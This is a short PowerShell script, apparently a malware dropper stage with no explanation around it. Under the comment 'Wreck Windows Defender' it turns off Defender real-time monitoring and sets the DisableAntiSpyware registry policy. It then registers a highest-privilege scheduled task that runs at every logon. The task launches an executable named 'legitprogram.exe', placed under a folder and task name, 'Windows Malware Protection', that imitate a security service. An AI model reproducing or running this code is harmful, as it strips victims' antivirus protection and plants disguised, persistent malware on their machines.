#Wreck Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true
$registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$Name = "DisableAntiSpyware"
$value = "1"
New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType DWORD -Force | Out-Null

#Create startup Task
$triggers = @()
$triggers += New-JobTrigger -AtLogOn
$triggers += New-JobTrigger -Once -At (Get-Date).AddMinutes(1)
$setting = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries
$action = New-ScheduledTaskAction -Execute 'C:\ProgramData\Windows Malware Protection\legitprogram.exe'
Register-ScheduledTask -Action $action -Settings $setting -Trigger $triggers -RunLevel Highest -TaskName "Windows Malware Protection"